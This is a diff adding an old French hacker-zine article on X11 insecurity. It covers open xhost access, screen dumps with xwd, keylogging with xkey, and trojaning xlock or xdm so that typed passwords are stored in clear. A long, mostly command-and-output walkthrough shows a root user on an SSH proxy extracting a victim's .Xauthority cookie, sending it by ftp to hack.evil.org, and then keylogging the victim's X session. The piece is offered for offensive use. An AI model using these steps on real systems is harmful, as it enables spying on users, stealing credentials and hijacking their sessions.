@@ -1,0 +1,287 @@
+Securite sous X11 :
+
+La partie I a ete faite a partir de X.scurity sur rootshell (www.rootshell.com).
+Vous pourrez aussi trouver dans cryptel 4 un autre article dessus fait
+par cyberjunk, pour ceux qui n'auront rien compris (bien fait d'ailleur). :)
+La partie II a partir ssh-X11 toujour sur rootshell.
+
+Biensur cet article ne s'inspire pas que des articles sité plus haut.
+Je dois beaucoup au man...
+ 
+
+Partie 1 = Securite sous X11 :
+
+bon je m'adresse a ceux qui connaissent assez bien le systeme X. Meme si je fais une legere description
+de X il est preferable d'aller voir les man dans ../doc/.
+
+==>Qu'est ce que c'est X11 ???
+
+X11, pour ceux qui ne sont pas habitue aux UNIX, peut etre assimile a un serveur, qui permet aux utilisateurs de travailler en mode graphique...
+Quand vous tapez la commande "startx" enfait votre Window Maker ainsi que les logiciel qui tournent 
+au demarage demande au a X de se connecter. Un serveur X n'est pas un joyeux environnement graphique,
+c vos programmes qui le transforment en environnement graphique convivial.
+Pour les details je vous laisse joint a cette articles quelques MAN sur X (en anglais bien evidemment).
+
+
+==>Acces a X11 :
+Les acces a X11 sont souvent reserves a des utilisateurs specifiques (souvent ceux qui ont un acces physique a la machine), et cette acces (Dispaly)est configurable de differentes manieres : 
+
+$ xhost +
+
+$ xhost +
+access control disabled, clients can connect from any host
+
+comme vous voyez cette commande permeta n'importe qu'elle host de ce connecter a X.
+
+$ xhost -
+access control enabled, only authorized clients can connect
+
+Dans ce cas, c'est le contraire...
+
+$ xhost + 102.23.142.32
+102.23.142.32 being added to access control list
+
+la seulement l'hote qui possede l'ip 102.23.142.32 est ajoute a l'access list...
+
+il existe bien entendu la commande :
+
+$ xhost - 102.23.142.32 
+102.23.142.32 being removed from access control list
+
+Les acces se trouve dans le fichier /etc/X*.hosts
+
+Beaucoup de site leur X avec pour default  le X disable, c'est a dire : (" access control disabled, clients can connect from any host) que n'importe quel host peut se connecter a X...
+
+==> X scanner :
+
+C'est la qu'intervient les X scanner...
+Tout le monde peu en programmer un. Sachant que le port de X est 6000, le scanner regarde toutes les
+possibilités de connection sur ce port, s'il a une possibilité le XOpenDisplay renvoie la structure DISPLAY initielisée et prend un pointeur contenant le nom du display a ouvrire (si c un programme : [programme]:0.0, si c une macjine [IP]:0.0  seulement si il est configure comme disable par defaut (ou su vous etes permit par le X). Si c enabel vour renvera la valeur NULL ou 0. Si le display ne peut pas etre ouvert vous ne pouvez pas vous connecter a X.
+
+C'est un premier defaut de X. Enfin un defaut de configuration...
+
+
+===>Connection en Display enable (renvoi de 0 ou NULL):
+
+Un autre probleme, plus grave, et tres connu de X est le fait que l'on peut se connecter sur X sans pour autant que le display soit disable. 
+
+Voici les ligne qu'il faut taper...
+
+$ rlogin [ -8EL] [-e char] [ -l username ] host
+$ xwd -root -display localhost:0.0 > ~/snarfed.xwd
+$ exit
+$ xwud -in ~/snarfed.xwd
+
+Si vous faite ca vous aurez ainsi l'ecran de root du X.
+Vous aurez remarque qu'il faut se connecter par rlogin. Si vous ne connaissez pas la technique il existe different article sur la technique (dont un dans phrack), j'en ai fais un aussi (inspire de l'article de phrack, mais je ne me contente pas que de recopier) mais a l'heure ou j'ecris ces lignes je ne sais pas ou vous pourrez le trouver  ...
+
+
+===> XWD = SNOOPING :
+
+Xwd est un utilitaire donne avec le systeme X windows.
+Vous pourrez trouver dans ./docs/MAN la description complete de xwd...
+Pour resumer : X Window Dump...
+Il sauve les images des fenetre dans un format special que xwud peut lire.
+La encore vous pourrez trouver la desription complete de xwud dans ./docs/MAN ...
+ALLEZ VOIR ./docs/MAN POUR SAVOIR COMMENT MARCHENT CES UTILITAIRES!!!
+
+En regardant bien le MAN vous pouvez reperez la commande suivante :
+xwd avec l'option -root
+
+$ xwd -root localhost:0.0 > file #va dumper l'image du seveur X de root...
+
+$ xwud -in file #vous pourrez lire ainsi l'image dumper dans file
+
+A noter qu'on a deja utiliser ces commandes plus haut ...
+
+==> Lire le clavier ; SNOOPING METHODS:
+
+il s'agit ici de pouvoir avoir acces au canal d'entre, c'est a dire le clavier.
+Si on peut se connecter a un display (c'est a dire un serveur X), on peut lire n'importe 
+quelle frappe du clavier, notemment avec un programme : xkey.
+Pour plus d'info allez voir : http://www.tuxfinder.com
+Vous pourrez y recuperer xkey.
+
+===>Trojan et X :
+
+Il s'agit de faut password prompting. C'est a dire d'un programme modifie, 
+qui puisse, en particulier, stocker les passwd tapes lors de la demande.
+L'exemple le plus frequent est le cas de Xlock. Xlock est un utilitaire X
+qui demande le passwd pour avoir acces aux fichiers. On peut alors aisement
+ce procurer le source (Xlock.c) et le modifier de maniere a ce que avant de 
+crypter le passwd tape par l'utilisateur pour le comparer avec le fichier /etc/passwd,
+Xlock stocke le passwd taper (en clair donc) dans un fichier dans lequel on pourra
+avoir acces ;)))).
+Ainsi on risque fort de pouvoir se procurer tout les passwd en clair, sans
+pour autant attirer l'attention, puisque cela prendra seulement quelque bit en plus.
+Et encore apres une capture on pourra toujour arreter le trojan.
+
+Un trojan peut etre accompli avec xdm. XDM est le programme qui demande le passwd
+au demarage d'une maniere graphique. La encore pour plus de renseignement sur XDM
+allez voir ./docs/MAN.
+
+Vous pourrez aussi voir le source joins dans l'article de cyberjunk (cryptel 4)
+
+
+Partie 2 = SSH et X11 :
+
+Pour SSH allez donc voir l'article que steal a produit dans UnderWayy 2 ou encore la doc que j'ai mis a votre disposition dans ./docs/ .
+Il vous faudra aussi avoir de serieuse bas pour NFS, je ne reexpliquerais pas le
+systeme ici.
+
+Passons directement au sujet qui nous interresse. 
+
+==>Connection au serveur X par SSH :
+
+1 : SSH :
+Quand un utilisateur se connecte a un hote distant pas syteme SSH, le daemon SSH
+de l'hote va servir une requete, pour l'authentification du client. Pendant que le client SSH tourne sur la machine de l'utilisateur, le processeur serveur, SSHD, tourne sur le shell de l'hote distant. Si l'utilisateur est equipe pour faire du X
+sur la machine distante, il pourra faire tourner ds programme X de l'hote sur sa console. Ce qui est assez evidant. 
+
+2 : SSH et X windows :
+On a vu pus haut que les eux acces principal de controle ne sont pas sur (ecran, et
+clavier).
+SSH resous le probleme en faisant passer tous les packets X11 dans le secure channel. Il empeche notemment le sniffing de donnees sensible (passwd, etc.).
+Je passe ici le protocole de connection de X sous ssh. La seul chose importante qu'il faut retenir c'est que les donnees sensible lors de la connection passe sous
+secure channel, et que autre chose, le fichier .Xauthority qui contient la valeur 
+proxy etablie lors d'une connection X sous SSH et place DANS l'account accede par 
+SSH.
+Pour ceux qui voudraient en savoir + je leur conseil vivement d'aller voir :
+./docs/ssh-x11.ps §4.2 et §4.3 .
+
+Ainsi on peut dire que SSH securise bien (meme tres bien) toute les donnes transmisent entre le client et le serveur lors d'une connection. Mais, probleme,
+ne securise pas l'acces au fichier .Xauthority... :)))
+
+3 : WAIT !!! I'm coming :))))) :
+
+L'attaque en elle meme est assez complique, enfin complique, il faut pouvoir la
+comprendre, et par consequent faire marcher sa petite tete.
+J'ai repris les exemples de la doc ssh-X11. Si vous preferez voir la version originale n'hesitez pas. Vous  prouverez ainsi que mon travail est inutile :))))).
+
+Toujour prise dans cette meme doc, vous pouvez retrouver une image, SX11.jpg je crois qu'elle s'appelle, qui vous sera sans aucun doute tres utile. 
+
+Deuxieme point : cette attaque fait appel a des connaissance a propos de NFS, 
+allez donc voir les NoROUTE.
+
+troiseme chose : il vous faut un account root sur le serveur... C pas le serveur
+qu'il faut hacker, c'est la machine de la victime...
+
+quatrieme point : si vous connaissez rien aux commandes UNIX c'est pas la peine
+d'aller plus loin, vous comprendrez rien. stealthyx a fait des txt dans underwayy1
+et underwayy2 a ce propos.
+
+passons aux choses serieuses :
+
+deux personnes ont chacun une machine relie a un proxy, ou si vous preferez un serveur. Ils ont chacun leurs account respectif sur se serveur.
+
+si on reprend l'exemple que nous donne cette chere doc ces deux personnes ont pour nom : joe et dood sur leur machines respective : target.innocent.org et hack.evil.org (le mec qui nomme sa machine comme ca dans la reallite, ca metonnerais pas qu'il soit trace par la dst celui la ...). Bon !
+Sur le serveur proxy.host.org, ils ont chacun un account respectif : victim pour
+joe (va me faire pitie celui la) et hacker pour dood (lui y cherche a pas se faire remarquer:))). Bon je vous ferais remarquer que ces noms ne sont pas de moi. Mais
+puisque a ce qui parait ca aide a comprendre... 
+
+Donc notre valeureux dood (ou hacker comme vous voulez) va se connecter a proxy.host.org via ssh :
+
+dood@hack.evil.org$ ssh -l hacker proxy.host.org
+hacker's password :
+Last login: Wed May 28 13:28:02 1999 from hack.evil.org
+
+Welcome on proxy.host.org my friend !!! 
+
+voila! Pour les commandes ssh allez donc voir ./docs/MAN ou encore ./docs/MAN/ssh-2.0.8.tar.gz.readme pour les commandes ssh (ces docs vous donnerons
+les commandes ssh2 mais pour ssh vou aurez cas enlever le 2 systematiquement).
+
+A present notre preux chevalier va se renseigner sur Joe ou victim.
+Mais regardons d'abrd le DYSPLAY.
+
+hacker@proxy.host.org$ echo $DISPLAY
+proxy:10.0
+
+Bon, revenons un instant a ce DISPLAY : si Joe se connect au serveur juste apres lui
+sont DISPLAY va etre superieur a celui de hacker de 1. 
+
+hacker@proxy.host.org$ w | grep victim
+victim p3 target.innocent.org 12:56 PM 1 -bash
+hacker@proxy.host.org$ lsof -i TCP:ssh | grep target.innocent.org
+sshd	211	root	5u	inet	0x0063f200	0t0	TCP	proxy.host.org:ssh->target.innocent.org:1022
+
+
+Voici donc notre hacker informe de tout les faits et geste de notre petite victime.
+Celle ci a d'ailleur la bonne idee de se connecter au serveur, toujour par
+ssh.
+
+hacker@proxy.host.org$ su
+password:
+root@proxy.host.org# xauth -f ~victim/.Xauthority extract ~hacker/proxyauth proxy:11.0 #cf ./docs/MAN pour xauth
+root@proxy.host.org# chown hacker ~hacker/proxyauth #l'utilisateur principal de ./proxyauth deviens hacker.
+root@proxy.host.org# exit
+exit
+hacker@proxy.host.org$ ftp hack.evil.org
+connected to hack.evil.org.
+220 hack FTP server (VERSION 6.2) ready.
+Name: dood
+331 Password required for dood.
+Password:
+230-
+230- Welcome on hack.evil.org.
+230-
+230- User dood logged in. Remote system type is UNIX. Using binary mode to transfer files.
+ftp> put proxyauth
+local: proxyauth remote: proxyauth
+200 PORT command successful.
+150 Opening BINARY mode data connection for 'proxyauth'.
+104 bytes send in 0.04 seconds (2.26 KB/s)
+ftp> quit
+221 Goodbye.
+hacker@proxy.host.org$ exit
+logout
+
+Bon je pense que vous aurez compris que le but de cette serie de commande est de
+se procurer la valeur d'authentification proxy de la victime et se la foutre sur
+sa becane. Il va pouvoir ainsi  faire tourner des client X (les client X sont les
+programmes X du serveur que la victimes fait tourner par reseau jusqu'a sa machine), sur le serveur X de l'utilisateur. 
+
+Maintenant la session NFS va commencer :
+showmount 
+dood@hack.evil.org$ showmount -e proxy.host.org #pour les linuxiens ca sera : #/usr/sbin/showmount
+Exports list on proxy.host.org:
+/export/home
+dood@hack.evil.org$ askhandle proxy.host.org
+  /export/home >nfshandle
+dood@hack.evil.org$ nfsmenu nfshandle
+  proxy.host.org /export/home
+uid = -2, gid = -2
+proxy.host.org:/export/home> getattr victim
+type: 2
+mode: 40755
+nlink: 14
+uid: 2001
+gid: 42
+size: 4096
+atime: Sat May 29 17:49:29 1999
+mtime: Sat May 29 17:49:29 1999
+ctime: Sat May 29 17:49:29 1999
+proxy.host.org:/export/home> id 2001 42
+uid = 2001, gid = 42
+proxy.host.org:/export/home>cd victim
+proxy.host.org:/export/home/victim> read ./Xauthority Xauth
+proxy.host.org:/export/home/vistim>quit
+dood@hack.evil.org$ xauth -f Xauth extract proxyauth proxy 11.0
+
+apres ces quelques manipulation, on peut se connecter au serveur X de la victime.
+
+dood@hack.evil.org$ xauth merge proxyauth
+dood@hack.evil.org$ xkey proxy.host.org:11.0 #on a deja parle de Xkey n'est ce pas?
+
+A partir dela vous pouvez vous amusez a poser des trojan :)))
+
+END !!!
+
+==> MAN en +, ssh-X11.ps, SSH 2.0.8 et une doc de SSH !!! tout ca dans ./docs/
+
+Note a propos de ssh 2 : il est tout a fait possible que l'erreur de securite 
+que nous venons de decrire pour SSH2 soit rectifie. Ayant essailler pour ssh1,
+je ne peus pas l'affirmer moi meme. Je mets ici SSH2 (la derniere version) a votre
+disposition seulement pour vous eclairer sur le systeme SSH... 
+
+
+!!!TESTED AND APPROUVED !!!
